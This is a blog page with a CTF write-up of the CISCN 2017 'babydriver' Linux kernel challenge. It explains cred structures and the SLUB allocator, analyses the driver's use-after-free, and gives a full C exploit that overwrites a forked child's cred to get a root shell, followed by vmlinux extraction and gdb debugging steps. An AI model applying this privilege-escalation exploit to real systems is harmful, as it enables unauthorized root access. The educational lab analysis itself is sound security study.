<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>I0gan</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:type" content="website">
<meta property="og:title" content="I0gan">
<meta property="og:url" content="http://blog.i0gan.cn/page/3/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:locale">
<meta property="article:author" content="i0gan">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="I0gan" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">I0gan</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.i0gan.cn"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-wp-babydriver" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/15/wp-babydriver/" class="article-date">
  <time datetime="2020-09-15T13:44:03.000Z" itemprop="datePublished">2020-09-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/15/wp-babydriver/">wp baby driver</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Kenel-pwn-ciscn-2017-baby-driver"><a href="#Kenel-pwn-ciscn-2017-baby-driver" class="headerlink" title="Kenel pwn ciscn 2017 baby driver"></a>Kenel pwn ciscn 2017 baby driver</h1><p>第一天真正开始做kernel pwn类的题, 于用户空间做的体确实有点不太一样, 利用从python 转向c语言写与驱动交互的程序, 找驱动程序的漏洞, 然后提权为root</p>
<h2 id="知识预备"><a href="#知识预备" class="headerlink" title="知识预备"></a>知识预备</h2><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>在linux中每个进程都有它自己的权限,而标示着权限的那些信息,比如uid，gid等都是被放在一个叫cred的结构体当中的,也就是说每个进程中都有一个cred结构,如果能够修改进程的cred的uid和gid为0, 那么该进程的权限就为root权限了.<br>以下是cred结构体:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当我们是root权限的时候,我们的uid是等于0的,另外此版本的cred的大小是0xa8;</p>
<h3 id="SLAB-amp-SLUB"><a href="#SLAB-amp-SLUB" class="headerlink" title="SLAB &amp; SLUB"></a>SLAB &amp; SLUB</h3><p>  kernel中没有libc，但是仍然需要内存的分配和释放，这时就会使用到kmalloc&amp;kfree  API（相当于用户态使用的malloc&amp;free）。kmalloc&amp;kfree的实现是通过SLAB或SLUB分配器，现在一般是SLUB分配器。分配器是通过一个多级的结构进行管理。首先有cache层，cache是一个结构，其中保存的对象分为空对象、部分使用的对象和完全使用的对象进行管理。对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。kmalloc使用了多个cache，每个cache对应一个2的幂次大小的一组内存对象。</p>
<p>  SLAB和SLUB都是内核的内存管理机制。为了提高效率，SLAB要求系统暂时保留已经释放的内核对象空间，以便下次申请时不需要再次初始化和分配。但是SLAB比较严格，需要再次申请的数据类型和大小与原先的完全一样，并且不同cache的无法分在同一页内；而SLUB较为宽松，和堆分配机制更为相似。</p>
<h2 id="设备程序分析"><a href="#设备程序分析" class="headerlink" title="设备程序分析"></a>设备程序分析</h2><p>驱动中存在一个结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct babydev_struct&#123;</span><br><span class="line">    char *device_buf;</span><br><span class="line">    size_t device_buf_len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="babyopen函数"><a href="#babyopen函数" class="headerlink" title="babyopen函数"></a>babyopen函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  <span class="comment">//对babydev_struct.device_buf 进行开辟一个0x40大小的内存</span></span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">0x40</span>LL;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="babywrite函数"><a href="#babywrite函数" class="headerlink" title="babywrite函数"></a>babywrite函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, buffer, v4); <span class="comment">// 从用户空间拷贝数据到babydev_struct.device_buf</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="babyread-函数"><a href="#babyread-函数" class="headerlink" title="babyread 函数"></a>babyread 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_to_user(buffer, babydev_struct.device_buf, v4); <span class="comment">//从内核中拷贝数据到用户空间</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="babyioctrl函数"><a href="#babyioctrl函数" class="headerlink" title="babyioctrl函数"></a>babyioctrl函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);<span class="comment">// 根据用户来控制开辟内存空间的大小</span></span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;\x013defalut:arg is %ld\n&quot;</span>, v3, v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="babyrelease函数"><a href="#babyrelease函数" class="headerlink" title="babyrelease函数"></a>babyrelease函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);             <span class="comment">// 释放babydev_struct.device_buf, 对指针没有清0, 造成uaf漏洞</span></span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这个从用户态的pwn来看好像漏洞并不明显,但是我们现在是在内核态了,要把用户态的单线程的思维抛开了,从多线程的角度来思考。</p>
<ol>
<li>首先打开两次设备，通过ioctl将babydev_struct大小为的cred结构体的大小(不同版本kernel的可能不一样,需要通过源码去算);</li>
<li>然后释放其中一个设备，fork出一个新进程，此时这个新进程的cred 的空间就会重新开辟, 然而系统就会把之前大小一样空闲内存空间分配给它,。</li>
<li>第二个打开的文件描述符对这块空间进行写操作，只需要将uid和gid改为0，实现root提权</li>
</ol>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -o exp -static -w</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    	<span class="comment">// vul: uaf</span></span><br><span class="line">        <span class="keyword">int</span> fd_1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">int</span> fd_2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR); <span class="comment">//babydev_struct.device_buf 记录的是 fd_2</span></span><br><span class="line">        <span class="keyword">pid_t</span> pid;</span><br><span class="line">        ioctl(fd_1, <span class="number">0x10001</span>, <span class="number">0xa8</span>); <span class="comment">// 开辟0xa8的内核空间, 命名为chunk1吧</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">-1</span> == fd_1 || <span class="number">-1</span> == fd_2) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;open babydev failed!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd_1);  <span class="comment">// 关闭fd_1, ioctl所开辟的0xa8空间, 释放掉chunk1内存,</span></span><br><span class="line">        pid = fork(); <span class="comment">// fork 时有点类似与malloc中的fastbin原理, 子进程开辟cred内存的时候, 先遍历大小合适的空闲内存, 然后直接分配</span></span><br><span class="line">        <span class="comment">// child process</span></span><br><span class="line">        <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">char</span> buf[<span class="number">60</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">                write(fd_2, buf, <span class="number">60</span>);  <span class="comment">//向释放掉的chunk1内存中填充60个0, 然而也是该进程的cred结构体,使uid和gid为0, 提权为root</span></span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);     <span class="comment">//运行子进程时会继承父进程的权限</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                wait();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="提取vmlinux"><a href="#提取vmlinux" class="headerlink" title="提取vmlinux"></a>提取vmlinux</h3><p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>脚本如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># Use readelf to check if it&#x27;s a valid ELF</span></span><br><span class="line">	<span class="comment"># <span class="doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span></span><br><span class="line">	<span class="comment">#       and not just an elf</span></span><br><span class="line">	readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">	cat <span class="variable">$1</span></span><br><span class="line">	<span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span></span><br><span class="line">	<span class="comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line">	<span class="keyword">for</span>	pos <span class="keyword">in</span> `tr <span class="string">&quot;<span class="variable">$1</span>\n<span class="variable">$2</span>&quot;</span> <span class="string">&quot;\n<span class="variable">$2</span>=&quot;</span> &lt; <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | grep -abo <span class="string">&quot;^<span class="variable">$2</span>&quot;</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line">		tail -c+<span class="variable">$pos</span> <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">		check_vmlinux <span class="variable">$tmp</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>	[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">&quot;<span class="variable">$img</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2</span><br><span class="line">	<span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f <span class="variable">$tmp</span>&quot;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn&#x27;t work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">&#x27;\037\213\010&#x27;</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">&#x27;BZh&#x27;</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">&#x27;\211\114\132&#x27;</span> xy    <span class="string">&#x27;lzop -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="string">&#x27;lz4 -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure>

<p>保存为extract-vmlinux</p>
<p>提取vmlinux, 方便调试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;extract-vmlinux .&#x2F;bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>

<h3 id="启动gdb"><a href="#启动gdb" class="headerlink" title="启动gdb"></a>启动gdb</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb .&#x2F;vmlinux -q</span><br></pre></td></tr></table></figure>

<h3 id="启动boot-sh获取babydriver的加载基址"><a href="#启动boot-sh获取babydriver的加载基址" class="headerlink" title="启动boot.sh获取babydriver的加载基址"></a>启动boot.sh获取babydriver的加载基址</h3><p>使用 cat /proc/moudles或者lsmod</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; # lsmod</span><br><span class="line">babydriver 16384 2 - Live 0xffffffffc0000000 (OE)</span><br></pre></td></tr></table></figure>



<h3 id="导入符号表"><a href="#导入符号表" class="headerlink" title="导入符号表"></a>导入符号表</h3><p>最后面填写babydriver的基址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file .&#x2F;fs&#x2F;lib&#x2F;modules&#x2F;4.4.72&#x2F;babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>



<h3 id="调试qumu"><a href="#调试qumu" class="headerlink" title="调试qumu"></a>调试qumu</h3><p>在boot.sh中添加参数如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-gdb tcp::9999</span><br></pre></td></tr></table></figure>

<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>运行程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;boot.sh</span><br></pre></td></tr></table></figure>

<p>在gdb中连接该qemu程序</p>
